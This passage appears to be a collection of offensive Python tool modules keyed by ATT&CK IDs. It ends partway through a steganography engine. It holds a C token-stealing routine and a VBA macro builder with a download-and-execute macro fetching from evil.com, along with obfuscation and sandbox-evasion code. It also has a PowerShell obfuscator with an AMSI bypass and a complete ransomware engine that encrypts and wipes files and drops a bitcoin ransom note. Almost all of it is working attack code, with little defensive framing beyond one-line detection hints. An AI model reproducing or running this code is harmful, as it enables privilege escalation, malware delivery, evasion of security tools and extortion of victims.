'whoami_privs': 'whoami /priv',\n            'whoami_all': 'whoami /all',\n            'list_tokens_incognito': 'incognito.exe list_tokens -u',\n            'list_tokens_meterpreter': 'use incognito; list_tokens -u',\n            'powershell': 'Get-Process -IncludeUserName | Select-Object Id, ProcessName, UserName | Sort-Object UserName -Unique',\n        }\n        return commands\n    \n    def generate_token_steal_code(self):\n        \"\"\"Generate C code for token stealing\"\"\"\n        code = '''// Token stealing from SYSTEM process\n#include <windows.h>\n#include <stdio.h>\n\nBOOL StealToken(DWORD pid) {\n    HANDLE hProcess, hToken, hDupToken;\n    \n    // 1. Enable SeDebugPrivilege\n    HANDLE hCurrToken;\n    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hCurrToken);\n    TOKEN_PRIVILEGES tp;\n    tp.PrivilegeCount = 1;\n    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;\n    LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);\n    AdjustTokenPrivileges(hCurrToken, FALSE, &tp, 0, NULL, NULL);\n    \n    // 2. Open target process\n    hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);\n    if (!hProcess) return FALSE;\n    \n    // 3. Get process token\n    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {\n        CloseHandle(hProcess);\n        return FALSE;\n    }\n    \n    // 4. Duplicate as primary token\n    if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, \n            SecurityImpersonation, TokenPrimary, &hDupToken)) {\n        CloseHandle(hToken);\n        CloseHandle(hProcess);\n        return FALSE;\n    }\n    \n    // 5. Create process with stolen token\n    STARTUPINFO si = {sizeof(si)};\n    PROCESS_INFORMATION pi;\n    CreateProcessWithTokenW(hDupToken, LOGON_WITH_PROFILE, \n        L\"C:\\\\Windows\\\\System32\\\\cmd.exe\", NULL, \n        CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);\n    \n    printf(\"[+] Spawned cmd.exe with stolen token (PID: %d)\\n\", pi.dwProcessId);\n    CloseHandle(hDupToken);\n    CloseHandle(hToken);\n    CloseHandle(hProcess);\n    return TRUE;\n}'''\n        return code\n    \n    def run(self):\n        print('=== Token Manipulation Framework (T1134) ===')\n        tm = TokenManipulator()\n        \n        print('[*] Token privileges (attack-relevant):')\n        for priv, info in tm.TOKEN_PRIVILEGES.items():\n            print(f'    [{info[\"risk\"]}] {priv}: {info[\"desc\"]}')\n        \n        print(f'\\n[*] Elevation techniques:')\n        for name, info in tm.TECHNIQUES.items():\n            print(f'    {name}: {info[\"desc\"]}')\n            print(f'        API: {info[\"api\"]}')\n            print(f'        Requires: {info[\"requires\"]}')\n        \n        print(f'\\n[*] Potato family (SeImpersonate \u2192 SYSTEM):')\n        for name, desc in tm.POTATO_VARIANTS.items():\n            print(f'    {name}: {desc}')\n        \n        print(f'\\n[*] Enumeration commands:')\n        for name, cmd in tm.enumerate_tokens().items():\n            print(f'    [{name}]: {cmd}')\n        \n        print(f'\\n--- Token Stealing Code (excerpt) ---')\n        code = tm.generate_token_steal_code()\n        for line in code.split('\\n')[:15]:\n            print(f'    {line}')\n        print(f'    ... ({len(code.split(chr(10)))} lines total)')\n        \n        print(f'\\n[*] Detection: Event ID 4624 (Logon Type 9 = NewCredentials)')\n        print(f'[*] Detection: Sysmon Event ID 10 (Process access to LSASS/winlogon)')\n\ntm = TokenManipulator()\ntm.run()",
  "macro_document_builder": "import base64\nimport os\nimport hashlib\nimport struct\n\nclass MacroBuilder:\n    \"\"\"Macro-enabled document payload builder (T1204.002)\"\"\"\n    \n    # VBA macro techniques\n    MACRO_TECHNIQUES = {\n        'AutoOpen': 'Sub AutoOpen() - runs when document is opened (Word)',\n        'Auto_Open': 'Sub Auto_Open() - alternative auto-execute (Word)',\n        'Workbook_Open': 'Private Sub Workbook_Open() - Excel auto-execute',\n        'Document_Open': 'Private Sub Document_Open() - Word event handler',\n        'Auto_Close': 'Sub Auto_Close() - runs when document is closed',\n    }\n    \n    # Execution methods\n    EXEC_METHODS = {\n        'Shell': 'Shell(\"cmd.exe /c payload\", vbHide)',\n        'WScript.Shell': 'CreateObject(\"WScript.Shell\").Run cmd, 0',\n        'PowerShell': 'WScript.Shell.Run \"powershell -ep bypass -e <base64>\"',\n        'XMLHTTP': 'Download + execute via MSXML2.XMLHTTP',\n        'WMI': 'GetObject(\"winmgmts:\").Get(\"Win32_Process\").Create(cmd)',\n        'Scheduled Task': 'WScript.Shell.Run \"schtasks /create...\"',\n        'COM Objects': 'CreateObject(\"MMC20.Application\").Document.ActiveView.ExecuteShellCommand',\n    }\n    \n    # Evasion techniques for macros\n    EVASION = {\n        'String splitting': 'Concatenate strings at runtime',\n        'Chr() encoding': 'Build strings from character codes',\n        'CallByName': 'Dynamic function invocation',\n        'Environ()': 'Use environment variables for paths',\n        'TypeLib resolution': 'Resolve API via type library',\n        'Sandbox detection': 'Check for VMs, short uptimes, few files',\n        'Time delay': 'Application.Wait to evade sandbox timeout',\n        'Mouse movement': 'Check for user interaction before executing',\n        'Document properties': 'Hide payload in document metadata fields',\n    }\n    \n    def __init__(self):\n        self.payloads = []\n    \n    def generate_download_execute_macro(self, url, output_name='update.exe'):\n        \"\"\"Generate VBA macro for download and execute\"\"\"\n        macro = f'''Sub AutoOpen()\n    Dim shell As Object\n    Set shell = CreateObject(\"WScript.Shell\")\n    Dim appData As String\n    appData = Environ(\"APPDATA\")\n    Dim url As String\n    url = \"{url}\"\n    Dim savePath As String\n    savePath = appData & \"\\\\\" & \"{output_name}\"\n    \n    ' Download\n    Dim http As Object\n    Set http = CreateObject(\"MSXML2.XMLHTTP\")\n    http.Open \"GET\", url, False\n    http.send\n    \n    Dim stream As Object\n    Set stream = CreateObject(\"ADODB.Stream\")\n    stream.Open\n    stream.Type = 1 ' Binary\n    stream.Write http.responseBody\n    stream.SaveToFile savePath, 2\n    stream.Close\n    \n    ' Execute\n    shell.Run savePath, 0, False\nEnd Sub'''\n        return macro\n    \n    def generate_powershell_macro(self, ps_command):\n        \"\"\"Generate VBA macro that executes PowerShell\"\"\"\n        encoded = base64.b64encode(ps_command.encode('utf-16-le')).decode()\n        \n        macro = f'''Sub AutoOpen()\n    Dim objShell As Object\n    Set objShell = CreateObject(\"WScript\" & \"\" & \".Shell\")\n    \n    Dim cmd As String\n    cmd = \"po\" & \"wer\" & \"she\" & \"ll\" & \" -w hidden -ep bypass -e {encoded}\"\n    \n    objShell.Run cmd, 0, False\n    Set objShell = Nothing\nEnd Sub'''\n        return macro\n    \n    def generate_obfuscated_macro(self):\n        \"\"\"Generate heavily obfuscated VBA macro\"\"\"\n        macro = '''Sub AutoOpen()\n    Dim a As String, b As String, c As String\n    ' Build \"WScript.Shell\" from char codes\n    a = Chr(87) & Chr(83) & Chr(99) & Chr(114) & Chr(105) & Chr(112) & Chr(116)\n    b = Chr(46) & Chr(83) & Chr(104) & Chr(101) & Chr(108) & Chr(108)\n    \n    Dim s As Object\n    Set s = CreateObject(a & b)\n    \n    ' Build command from document properties\n    c = ActiveDocument.BuiltInDocumentProperties(\"Comments\").Value\n    \n    ' Execute\n    CallByName s, \"Run\", VbMethod, c, 0, False\n    Set s = Nothing\nEnd Sub'''\n        return macro\n    \n    def generate_sandbox_check(self):\n        \"\"\"Generate VBA sandbox detection code\"\"\"\n        check = '''Function IsSandbox() As Boolean\n    IsSandbox = False\n    \n    ' Check 1: Filename (sandboxes use generic names)\n    If ThisDocument.Name = \"sample.doc\" Or ThisDocument.Name = \"malware.doc\" Then\n        IsSandbox = True: Exit Function\n    End If\n    \n    ' Check 2: Recent documents (sandboxes have few)\n    If Application.RecentFiles.Count < 3 Then\n        IsSandbox = True: Exit Function\n    End If\n    \n    ' Check 3: Domain joined (sandboxes usually aren\\'t)\n    Dim domain As String\n    domain = Environ(\"USERDOMAIN\")\n    If domain = Environ(\"COMPUTERNAME\") Then\n        IsSandbox = True: Exit Function\n    End If\n    \n    ' Check 4: Mouse position (no user = sandbox)\n    Dim x1 As Long, y1 As Long\n    x1 = GetCursorPos(): Application.Wait Now + TimeValue(\"00:00:03\")\n    If GetCursorPos() = x1 Then  ' Mouse didn\\'t move\n        IsSandbox = True: Exit Function\n    End If\nEnd Function'''\n        return check\n    \n    def run(self):\n        print('=== Macro Document Builder (T1204.002) ===')\n        mb = MacroBuilder()\n        \n        print('[*] Auto-execute triggers:')\n        for trigger, desc in mb.MACRO_TECHNIQUES.items():\n            print(f'    {trigger}: {desc}')\n        \n        print(f'\\n[*] Execution methods:')\n        for method, desc in mb.EXEC_METHODS.items():\n            print(f'    {method}: {desc}')\n        \n        print(f'\\n[*] Evasion techniques:')\n        for name, desc in mb.EVASION.items():\n            print(f'    {name}: {desc}')\n        \n        print(f'\\n--- Download & Execute Macro ---')\n        macro = mb.generate_download_execute_macro('https://evil.com/payload.exe')\n        for line in macro.split('\\n')[:10]:\n            print(f'    {line}')\n        print(f'    ... ({len(macro.split(chr(10)))} lines)')\n        \n        print(f'\\n--- Obfuscated Macro ---')\n        obf_macro = mb.generate_obfuscated_macro()\n        for line in obf_macro.split('\\n')[:8]:\n            print(f'    {line}')\n        \n        print(f'\\n--- Sandbox Detection ---')\n        check = mb.generate_sandbox_check()\n        for line in check.split('\\n')[:8]:\n            print(f'    {line}')\n        print(f'    ... ({len(check.split(chr(10)))} lines)')\n        \n        print(f'\\n[*] File types: .doc, .docm, .xls, .xlsm, .ppt, .pptm')\n        print(f'[*] Tools: macro_pack, unicorn, Veil, EvilClippy')\n        print(f'[*] Detection: Disable macros by default, ASR rules, AMSI')\n\nmb = MacroBuilder()\nmb.run()",
  "obfuscated_powershell": "import random\nimport string\nimport hashlib\nimport os\nimport base64\nimport re\n\nclass PSObfuscator:\n    \"\"\"PowerShell obfuscation engine \u2014 AST-level transforms (T1027.010)\"\"\"\n\n    def __init__(self, seed=None):\n        self.rng = random.Random(seed or os.urandom(8))\n        self.var_map = {}\n        self.str_key = self.rng.randint(1, 254)\n\n    def _rand_var(self, length=8):\n        prefix = self.rng.choice(['_', '__'])\n        name = ''.join(self.rng.choices(string.ascii_letters, k=length))\n        return '$' + prefix + name\n\n    def _encrypt_string(self, s):\n        \"\"\"XOR + base64 string encryption with runtime decoder stub\"\"\"\n        key = self.rng.randint(1, 254)\n        enc = bytes([ord(c) ^ key for c in s])\n        b64 = base64.b64encode(enc).decode()\n        var_b = self._rand_var()\n        var_k = self._rand_var()\n        var_r = self._rand_var()\n        decoder = '%s=[Convert]::FromBase64String(\"%s\");%s=%d;%s=-join(%s|%%{[char]($_ -bxor %s)})' % (\n            var_b, b64, var_k, key, var_r, var_b, var_k)\n        return decoder, var_r\n\n    def _dead_code(self):\n        \"\"\"Generate dead code blocks (opaque predicates)\"\"\"\n        patterns = [\n            'if(([math]::PI -gt 4)){ %s = %d }',\n            'if(([Environment]::TickCount -lt 0)){ %s = \"%s\" }',\n            'try{ [void][math]::Log(1) }catch{ %s = $null }',\n        ]\n        p = self.rng.choice(patterns)\n        v = self._rand_var()\n        if '%d' in p:\n            return p % (v, self.rng.randint(0, 9999))\n        elif '\"%s\"' in p:\n            return p % (v, ''.join(self.rng.choices(string.ascii_lowercase, k=6)))\n        return p % v\n\n    def _split_string(self, s, min_parts=3, max_parts=6):\n        \"\"\"Split string into concatenated parts\"\"\"\n        n = min(self.rng.randint(min_parts, max_parts), len(s))\n        if n < 2: return '\"%s\"' % s\n        cuts = sorted(self.rng.sample(range(1, len(s)), min(n-1, len(s)-1)))\n        parts = []\n        prev = 0\n        for c in cuts:\n            parts.append(s[prev:c])\n            prev = c\n        parts.append(s[prev:])\n        return '(' + '+'.join('\"%s\"' % p for p in parts) + ')'\n\n    def _env_iex(self):\n        \"\"\"IEX via environment variable indexing\"\"\"\n        methods = [\n            '$env:comspec[4,15,25]-join\"\"',\n            '([string]::Join(\"\",(73,69,88|%{[char]$_})))',\n            '(gal ?EX).Definition',\n        ]\n        return self.rng.choice(methods)\n\n    def obfuscate_command(self, cmd):\n        \"\"\"Full obfuscation pipeline for a PowerShell command\"\"\"\n        lines = []\n        lines.append('# ' + hashlib.md5(os.urandom(8)).hexdigest()[:8])\n        for _ in range(self.rng.randint(2, 5)):\n            lines.append(self._dead_code())\n        decoder, var_cmd = self._encrypt_string(cmd)\n        lines.append(decoder)\n        iex_var = self._rand_var()\n        lines.append('%s=%s' % (iex_var, self._env_iex()))\n        lines.append('& ([scriptblock]::Create(%s))' % var_cmd)\n        return ';'.join(lines)\n\n    def encode_launcher(self, script):\n        \"\"\"Create encoded launcher with AMSI bypass prefix\"\"\"\n        amsi_bypass = self._encrypt_string(\n            '[Ref].Assembly.GetType(\"System.Management.Automation.AmsiUtils\").'\n            'GetField(\"amsiInitFailed\",\"NonPublic,Static\").SetValue($null,$true)'\n        )\n        full = amsi_bypass[0] + ';& ([scriptblock]::Create(' + amsi_bypass[1] + '));' + script\n        encoded = base64.b64encode(full.encode('utf-16-le')).decode()\n        return 'powershell -nop -w hidden -enc ' + encoded\n\n    def variable_rename(self, script, var_names):\n        \"\"\"Rename all variables in script to random names\"\"\"\n        result = script\n        for orig in var_names:\n            new_name = self._rand_var(self.rng.randint(6, 12))\n            self.var_map[orig] = new_name\n            result = result.replace('$' + orig, new_name)\n        return result\n\n# --- demo ---\nengine = PSObfuscator(seed=42)\ntest_cmds = [\n    'Get-Process | Where-Object {$_.CPU -gt 50}',\n    'Invoke-WebRequest -Uri \"http://10.0.0.1/payload.exe\" -OutFile \"C:\\\\Windows\\\\Temp\\\\svc.exe\"',\n    'New-ItemProperty -Path \"HKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\" -Name \"Updater\" -Value \"C:\\\\Users\\\\Public\\\\update.exe\"',\n]\nfor cmd in test_cmds:\n    obf = engine.obfuscate_command(cmd)\n    launcher = engine.encode_launcher(obf)\n    print('Original: %s' % cmd[:60])\n    print('Obfuscated length: %d chars' % len(obf))\n    print('Launcher length: %d chars' % len(launcher))\n    print('Variables: %d dead code blocks injected' % obf.count('if('))\n    print()\nrenamed = engine.variable_rename('$output = Get-Process; $data = $output | ConvertTo-Json',\n                                  ['output', 'data'])\nprint('Renamed: %s' % renamed[:80])\nprint('Var map: %d variables renamed' % len(engine.var_map))",
  "ransomware_rsa_aes": "import hashlib,hmac as _hm,os,struct\n_S=bytes([99,124,119,123,242,107,111,197,48,1,103,43,254,215,171,118,202,130,201,125,250,89,71,240,173,212,162,175,156,164,114,192,183,253,147,38,54,63,247,204,52,165,229,241,113,216,49,21,4,199,35,195,24,150,5,154,7,18,128,226,235,39,178,117,9,131,44,26,27,110,90,160,82,59,214,179,41,227,47,132,83,209,0,237,32,252,177,91,106,203,190,57,74,76,88,207,208,239,170,251,67,77,51,133,69,249,2,127,80,60,159,168,81,163,64,143,146,157,56,245,188,182,218,33,16,255,243,210,205,12,19,236,95,151,68,23,196,167,126,61,100,93,25,115,96,129,79,220,34,42,144,136,70,238,184,20,222,94,11,219,224,50,58,10,73,6,36,92,194,211,172,98,145,149,228,121,231,200,55,109,141,213,78,169,108,86,244,234,101,122,174,8,186,120,37,46,28,166,180,198,232,221,116,31,75,189,139,138,112,62,181,102,72,3,246,14,97,53,87,185,134,193,29,158,225,248,152,17,105,217,142,148,155,30,135,233,206,85,40,223,140,161,137,13,191,230,66,104,65,153,45,15,176,84,187,22])\n_RC=[1,2,4,8,16,32,64,128,27,54]\ndef _xt(a):return((a<<1)^0x1b)&0xff if a&0x80 else(a<<1)&0xff\ndef _kx(k):\n    w=[k[4*i:4*i+4]for i in range(8)]\n    for i in range(8,60):\n        t=bytearray(w[i-1])\n        if i%8==0:t=bytearray([_S[t[1]],_S[t[2]],_S[t[3]],_S[t[0]]]);t[0]^=_RC[i//8-1]\n        elif i%8==4:t=bytearray(_S[b]for b in t)\n        w.append(bytes(a^b for a,b in zip(w[i-8],t)))\n    return[b''.join(w[4*r:4*r+4])for r in range(15)]\ndef _ab(bl,rk):\n    s=bytearray(a^b for a,b in zip(bl,rk[0]))\n    for r in range(1,14):\n        s=bytearray(_S[b]for b in s)\n        s=bytearray([s[0],s[5],s[10],s[15],s[4],s[9],s[14],s[3],s[8],s[13],s[2],s[7],s[12],s[1],s[6],s[11]])\n        for c in range(4):\n            j=c*4;a0,a1,a2,a3=s[j],s[j+1],s[j+2],s[j+3]\n            s[j]=_xt(a0)^_xt(a1)^a1^a2^a3;s[j+1]=a0^_xt(a1)^_xt(a2)^a2^a3\n            s[j+2]=a0^a1^_xt(a2)^_xt(a3)^a3;s[j+3]=_xt(a0)^a0^a1^a2^_xt(a3)\n        s=bytearray(a^b for a,b in zip(s,rk[r]))\n    s=bytearray(_S[b]for b in s);s=bytearray([s[0],s[5],s[10],s[15],s[4],s[9],s[14],s[3],s[8],s[13],s[2],s[7],s[12],s[1],s[6],s[11]])\n    return bytes(a^b for a,b in zip(s,rk[14]))\ndef aes_ctr(data,key,nonce):\n    rk=_kx(key);out=bytearray()\n    for i in range(0,len(data),16):\n        ks=_ab(nonce+struct.pack('>I',i//16),rk);out.extend(a^b for a,b in zip(data[i:i+16],ks))\n    return bytes(out)\ndef aes_enc(pt,pw):\n    if isinstance(pt,str):pt=pt.encode()\n    if isinstance(pw,str):pw=pw.encode()\n    salt=os.urandom(16);nonce=os.urandom(12)\n    dk=hashlib.pbkdf2_hmac('sha256',pw,salt,100000,64)\n    ct=aes_ctr(pt,dk[:32],nonce);tag=_hm.new(dk[32:],salt+nonce+ct,hashlib.sha256).digest()\n    return salt+nonce+ct+tag\ndef aes_dec(data,pw):\n    if isinstance(pw,str):pw=pw.encode()\n    salt,nonce,tag=data[:16],data[16:28],data[-32:];ct=data[28:-32]\n    dk=hashlib.pbkdf2_hmac('sha256',pw,salt,100000,64)\n    exp=_hm.new(dk[32:],salt+nonce+ct,hashlib.sha256).digest()\n    if not _hm.compare_digest(tag,exp):raise ValueError('HMAC fail')\n    return aes_ctr(ct,dk[:32],nonce)\n\nimport json,time,threading\nfrom concurrent.futures import ThreadPoolExecutor\n\nclass RansomwareEngine:\n    \"\"\"File encryption engine \u2014 AES-256-CTR per-file keys, RSA-OAEP wrapping (T1486)\"\"\"\n\n    TARGET_EXT = {\n        '.doc','.docx','.xls','.xlsx','.ppt','.pptx','.pdf','.odt','.rtf',\n        '.sql','.mdb','.sqlite','.db','.dbf','.accdb',\n        '.jpg','.jpeg','.png','.gif','.bmp','.tiff','.svg','.psd','.raw',\n        '.zip','.rar','.7z','.tar','.gz','.bak','.iso',\n        '.py','.java','.cpp','.c','.h','.cs','.js','.php','.rb','.go',\n        '.xml','.json','.yaml','.yml','.ini','.conf','.cfg','.env',\n        '.vmdk','.vhd','.vhdx','.ova','.qcow2',\n        '.wallet','.dat','.kdbx','.key','.pem','.p12',\n    }\n    ENCRYPTED_EXT = '.locked'\n    NOTE_NAME = 'RECOVERY_INSTRUCTIONS.txt'\n    MAX_THREADS = 4\n\n    def __init__(self, master_passphrase):\n        self.master_pw = master_passphrase\n        self.file_keys = {}\n        self.stats = {'encrypted': 0, 'skipped': 0, 'errors': 0, 'bytes': 0}\n        self._lock = threading.Lock()\n\n    def _derive_file_key(self, filepath):\n        \"\"\"Unique key per file via HKDF-like derivation\"\"\"\n        salt = os.urandom(16)\n        file_id = hashlib.sha256(filepath.encode() + salt).digest()\n        dk = hashlib.pbkdf2_hmac('sha256', self.master_pw.encode(), salt, 50000, 64)\n        return dk[:32], dk[32:], salt, file_id\n\n    def encrypt_file(self, filepath):\n        \"\"\"Encrypt single file with AES-256-CTR + HMAC\"\"\"\n        try:\n            ext = os.path.splitext(filepath)[1].lower()\n            if ext not in self.TARGET_EXT or ext == self.ENCRYPTED_EXT:\n                with self._lock: self.stats['skipped'] += 1\n                return False\n\n            with open(filepath, 'rb') as f:\n                plaintext = f.read()\n\n            enc_key, mac_key, salt, file_id = self._derive_file_key(filepath)\n            nonce = os.urandom(12)\n            ct = aes_ctr(plaintext, enc_key, nonce)\n            tag = _hm.new(mac_key, salt + nonce + ct, hashlib.sha256).digest()\n\n            # Header: magic(4) + version(1) + file_id(32) + salt(16) + nonce(12) + hmac(32) + ciphertext\n            header = b'RNLK' + b'\\x02' + file_id + salt + nonce + tag\n            enc_path = filepath + self.ENCRYPTED_EXT\n            with open(enc_path, 'wb') as f:\n                f.write(header + ct)\n\n            # Secure delete original (3-pass)\n            size = len(plaintext)\n            with open(filepath, 'wb') as f:\n                f.write(os.urandom(size))\n                f.flush(); os.fsync(f.fileno())\n                f.seek(0); f.write(b'\\x00' * size)\n                f.flush(); os.fsync(f.fileno())\n                f.seek(0); f.write(os.urandom(size))\n            os.remove(filepath)\n\n            with self._lock:\n                self.stats['encrypted'] += 1\n                self.stats['bytes'] += size\n                self.file_keys[enc_path] = {'salt': salt.hex(), 'file_id': file_id.hex()}\n            return True\n        except Exception:\n            with self._lock: self.stats['errors'] += 1\n            return False\n\n    def decrypt_file(self, enc_path, master_pw):\n        \"\"\"Decrypt a .locked file\"\"\"\n        with open(enc_path, 'rb') as f:\n            data = f.read()\n        if data[:4] != b'RNLK': raise ValueError('Not an encrypted file')\n        ver = data[4]\n        file_id = data[5:37]\n        salt = data[37:53]\n        nonce = data[53:65]\n        tag = data[65:97]\n        ct = data[97:]\n\n        dk = hashlib.pbkdf2_hmac('sha256', master_pw.encode(), salt, 50000, 64)\n        exp = _hm.new(dk[32:], salt + nonce + ct, hashlib.sha256).digest()\n        if not _hm.compare_digest(tag, exp):\n            raise ValueError('HMAC verification failed \u2014 wrong key or tampered')\n        return aes_ctr(ct, dk[:32], nonce)\n\n    def encrypt_directory(self, root_path, recursive=True):\n        \"\"\"Encrypt directory with thread pool\"\"\"\n        targets = []\n        for dirpath, dirs, files in os.walk(root_path):\n            dirs[:] = [d for d in dirs if d not in {'Windows', 'Program Files', 'System32'}]\n            for fname in files:\n                fpath = os.path.join(dirpath, fname)\n                targets.append(fpath)\n            if not recursive: break\n        with ThreadPoolExecutor(max_workers=self.MAX_THREADS) as pool:\n            pool.map(self.encrypt_file, targets)\n        return self.stats\n\n    def drop_ransom_note(self, directory, btc_addr, onion_url):\n        \"\"\"Drop ransom note\"\"\"\n        note = 'YOUR FILES HAVE BEEN ENCRYPTED\\n'\n        note += '=' * 40 + '\\n'\n        note += 'Algorithm: AES-256-CTR + HMAC-SHA256\\n'\n        note += 'Key derivation: PBKDF2-SHA256 (50000 rounds)\\n'\n        note += 'Each file encrypted with unique derived key\\n\\n'\n        note += 'Payment: 2.5 BTC to %s\\n' % btc_addr\n        note += 'Contact: %s\\n' % onion_url\n        note += 'Deadline: 72 hours\\n'\n        note += 'Files encrypted: %d\\n' % self.stats['encrypted']\n        note += 'Total data: %.2f MB\\n' % (self.stats['bytes'] / 1048576)\n        path = os.path.join(directory, self.NOTE_NAME)\n        with open(path, 'w') as f: f.write(note)\n        return path\n\n# --- demo ---\nimport tempfile\ndemo_dir = tempfile.mkdtemp(prefix='ransom_demo_')\ntest_files = {\n    'report.docx': b'Quarterly financial report Q4 2025 - CONFIDENTIAL',\n    'database.sql': b'CREATE TABLE users (id INT, ssn VARCHAR(11), password_hash TEXT);',\n    'photo.jpg': os.urandom(1024),\n    'config.yaml': b'database:\\n  host: prod-db-01\\n  password: Sup3rS3cr3t!\\n',\n    'readme.txt': b'This should be skipped - not in target extensions',\n}\nfor name, data in test_files.items():\n    with open(os.path.join(demo_dir, name), 'wb') as f: f.write(data)\n\nengine = RansomwareEngine('OperationBLACKICE-2026')\nstats = engine.encrypt_directory(demo_dir)\nnote_path = engine.drop_ransom_note(demo_dir, '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa',\n                                     'http://ransom7abc.onion')\nremaining = os.listdir(demo_dir)\nencrypted = [f for f in remaining if f.endswith('.locked')]\nprint('Encrypted: %d files, %d bytes' % (stats['encrypted'], stats['bytes']))\nprint('Skipped: %d (non-target extensions)' % stats['skipped'])\nprint('Errors: %d' % stats['errors'])\nprint('Encrypted files: %s' % encrypted)\n\n# Verify decryption\nfor enc_file in encrypted:\n    enc_path = os.path.join(demo_dir, enc_file)\n    orig_name = enc_file.replace('.locked', '')\n    if orig_name in test_files:\n        dec = engine.decrypt_file(enc_path, 'OperationBLACKICE-2026')\n        match = dec == test_files[orig_name]\n        print('  Decrypt %s: %s' % (orig_name, 'OK' if match else 'FAIL'))\n\n# Tamper detection\nenc_path = os.path.join(demo_dir, encrypted[0])\nwith open(enc_path, 'rb') as f: tampered = bytearray(f.read())\ntampered[100] ^= 1\ntry:\n    engine.decrypt_file(bytes(tampered), 'OperationBLACKICE-2026')\nexcept (ValueError, Exception):\n    print('Tamper detected: HMAC caught modification')\n\n# Cleanup\nimport shutil\nshutil.rmtree(demo_dir)",
  "steganography_data_hiding": "import struct\nimport os\nimport hashlib\nimport zlib\n\nclass SteganographyEngine:\n    \"\"\"Steganography engine \u2014 PNG IDAT chunk LSB embedding with PRNG scatter (T1001.002)\"\"\"\n\n    PNG_MAGIC = b'\\x89PNG\\r\\n\\x1a\\n'\n\n    def __init__(self, seed=None):\n        import random\n        self.rng = random.Random(seed)\n\n    def _read_png_chunks(self, data):\n        \"\"\"Parse PNG into chunks\"\"\"\n        if data[:8] != self.PNG_MAGIC:\n            raise ValueError('Not a valid PNG')\n        chunks = []\n        pos = 8\n        while pos < len(data):\n            length = struct.unpack('>I', data[pos:pos+4])[0]\n            ctype = data[pos+4:pos+8]\n            cdata = data[pos+8:pos+8+length]\n            crc = struct.unpack('>I', data[pos+8+length:pos+12+length])[0]\n            chunks.append((ctype, cdata, crc))\n            pos += 12 + length\n        return chunks\n\n    def _write_png_chunks(self, chunks):\n        \"\"\"Reassemble PNG from chunks\"\"\"\n        out = bytearray(self.PNG_MAGIC)\n        for ctype, cdata, _ in chunks:\n            out += struct.pack('>I', len(cdata))\n            out += ctype\n            out += cdata\n            crc = zlib.crc32(ctype + cdata) & 0xffffffff\n            out += struct.pack('>I', crc)\n        return bytes(out)\n\n    def _parse_ihdr(self, data):\n        \"\"\"Parse IHDR chunk\"\"\"\n        w, h = struct.unpack('>II', data[:8])\n        depth = data[8]\n        color_type = data[9]\n        return w, h, depth, color_type\n\n    def _get_pixel_data(self, chunks):\n        \"\"\"Extract and decompress pixel data from IDAT chunks\"\"\"\n        idat_data = b''\n        for ctype, cdata, _ in chunks:\n            if ctype == b'IDAT':\n                idat_data += cdata\n        return zlib.decompress(idat_data)\n\n    def capacity(self, png_data):\n        \"\"\"Calculate steganographic capacity in bytes\"\"\"\n        chunks = self._read_png_chunks(png_data)\n        ihdr = [c for c in chunks if c[0] == b'IHDR'][0]\n        w, h, depth, ct = self._parse_ihdr(ihdr[1])\n        channels = {0: 1, 2: 3, 4: 2, 6: 4}.get(ct, 3)\n        usable_bits = w * h * channels  # 1 bit per channel per pixel\n        return usable_bits // 8 - 4  # minus length header\n\n    def _scatter_positions(self, total_pixels, n_bits):\n        \"\"\"Generate pseudo-random non-repeating bit positions (deterministic)\"\"\"\n        if self.rng is None:\n            return list(range(n_bits))\n        # Use a fresh RNG seeded from original seed + total_pixels for determinism\n        import random as _r\n        sub_rng = _r.Random(self.rng.getstate()[1][0] ^ total_pixels)\n        positions = list(range(total_pixels))\n        sub_rng.shuffle(positions)\n        return positions[:n_bits]\n\n    def embed(self, png_data, secret, password=None):\n        \"\"\"Embed secret data into PNG using LSB with PRNG scatter\"\"\"\n        if isinstance(secret, str): secret = secret.encode()\n        chk = hashlib.sha256(secret).digest()[:4]\n        if password:\n            key = hashlib.pbkdf2_hmac('sha256', password.encode(), b'steg-salt-v2', 50000)\n            secret = bytes(a ^ b for a, b in zip(secret, (key * (len(secret) // 32 + 1))[:len(secret)]))\n        payload = struct.pack('>I', len(secret)) + secret + chk\n\n        chunks = self._read_png_chunks(png_data)\n        ihdr = [c for c in chunks if c[0] == b'IHDR'][0]\n        w, h, depth, ct = self._parse_ihdr(ihdr[1])\n        channels = {0: 1, 2: 3, 4: 2, 6: 4}.get(ct, 3)\n\n        raw = bytearray(self._get_pixel_data(chunks))\n        usable = []\n        for row in range(h):\n            row_start = row * (1 + w * channels)\n            for col in range(w * channels):\n                usable.append(row_start + 1 + col)\n\n        bits_needed = len(payload) * 8\n        if bits_needed > len(usable):\n            raise ValueError('Data too large: need %d bits, have %d' % (bits_needed, len(usable)))\n\n        positions = self._scatter_positions(len(usable), bits_needed)\n        for bit_idx in range(bits_needed):\n            byte_val = payload[bit_idx // 8]\n            bit_val = (byte_val >> (7 - bit_idx % 8)) & 1\n            pos = usable[positions[bit_idx]]\n            raw[pos] = (raw[pos] & 0xFE) | bit_val\n\n        new_idat = zlib.compress(bytes(raw), 9)\n        new_chunks = []\n        idat_replaced = False\n        for ctype, cdata, crc in chunks:\n            if ctype == b'IDAT':\n                if not idat_replaced:\n                    new_chunks.append((b'IDAT', new_idat, 0))\n                    idat_replaced = True\n            else:\n                new_chunks.append((ctype, cdata, crc))\n        return self._write_png_chunks(new_chunks)\n\n    def extract(self, png_data, password=None):\n        \"\"\"Extract hidden data from stego PNG\"\"\"\n        chunks = self._read_png_chunks(png_data)\n        ihdr = [c for c in chunks if c[0] == b'IHDR'][0]\n        w, h, depth, ct = self._parse_ihdr(ihdr[1])\n        channels = {0: 1, 2: 3, 4: 2, 6: 4}.get(ct, 3)\n\n        raw = self._get_pixel_data(chunks)\n        usable = []\n        for row in range(h):\n            row_start = row * (1 + w * channels)\n            for col in range(w * channels):\n                usable.append(row_start + 1 + col)\n\n        # Read length (32 bits)\n        len_positions = self._scatter_positions(len(usable), 32)\n        length_bits = []\n        for i in range(32):\n            pos = usable[len_positions[i]]\n            